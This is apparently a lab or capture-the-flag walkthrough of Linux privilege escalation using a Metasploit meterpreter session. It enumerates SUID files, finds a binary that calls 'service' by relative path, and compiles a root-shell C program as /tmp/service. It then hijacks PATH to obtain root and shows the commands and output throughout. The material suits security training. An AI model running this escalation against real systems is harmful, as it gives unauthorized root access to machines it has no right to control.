# Metasploit

## 01 - Detect

```
meterpreter > run post/linux/gather/enum_system

[+] Info:
[+]     Debian GNU/Linux 6.0
[+]     Linux debian 2.6.32-5-amd64 #1 SMP Tue May 13 16:34:35 UTC 2014 x86_64 GNU/Linux
[+]     Module running as "user" user
..[omitted]..
[*] Setuid/setgid files stored in /root/.msf4/loot/20220523231150_default_10.10.225.219_linux.enum.syste_075325.txt
..[omitted]..

userware@hackware-os:~$ sudo cat /root/.msf4/loot/20220523231150_default_10.10.225.219_linux.enum.syste_075325.txt
..[omitted]..
/usr/local/bin/suid-env
/usr/local/bin/suid-env2
..[omitted]..

meterpreter > execute -if strings -a "/usr/local/bin/suid-env"
Process 3284 created.
Channel 56 created.
/lib64/ld-linux-x86-64.so.2
5q;Xq
__gmon_start__
libc.so.6
setresgid
setresuid
system
__libc_start_main
GLIBC_2.2.5
fff.
fffff.
l$ L
t$(L
|$0H
service apache2 start
```

## 02 - Exploit

```
meterpreter > mkdir exploit
Creating directory: exploit
meterpreter > cd exploit/
meterpreter > edit /tmp/service.c
#include <stdio.h>  
  
int main() {  
    setgid(0);  
    setuid(0);  
    system("/bin/bash");  
    return 0;  
}
meterpreter > execute -f gcc -a "/tmp/service.c -o /tmp/service"
Process 3325 created.
meterpreter > shell -t
[*] env TERM=xterm HISTFILE= /usr/bin/script -qc /bin/bash /dev/null
Process 3330 created.
Channel 63 created.
export PATH=/tmp:$PATH
export PATH=/tmp:$PATH
user@debian:~$ /usr/local/bin/suid-env
/usr/local/bin/suid-env
root@debian:~# id
id
uid=0(root) gid=0(root) groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),1000(user)
root@debian:~# exit
exit
exit
user@debian:~$ exit
exit
exit
```

## 03 - Cleanup

`meterpreter > rm /tmp/service /tmp/service.c`